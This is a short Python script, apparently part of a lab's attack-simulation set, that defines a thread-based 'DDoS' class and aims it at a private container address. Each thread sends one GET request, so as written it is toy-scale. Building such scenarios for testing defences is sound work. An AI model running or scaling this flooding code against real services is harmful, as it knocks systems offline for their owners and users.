# attack_scenarios/ddos_attack.py
import threading
import time
import requests

class DDoSAttack:
    def __init__(self, target_url, threads=10):
        self.target_url = target_url
        self.threads = threads

    def flood(self):
        print(f"[DDoS] Sending request to {self.target_url}")
        try:
            requests.get(self.target_url, timeout=1)
        except Exception as e:
            print(f"[DDoS] Error: {e}")

    def execute(self):
        print(f"[DDoS] Launching DDoS attack on {self.target_url} with {self.threads} threads.")
        thread_list = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.flood)
            t.start()
            thread_list.append(t)
        for t in thread_list:
            t.join()

if __name__ == "__main__":
    atk = DDoSAttack("http://172.20.0.11")
    atk.execute()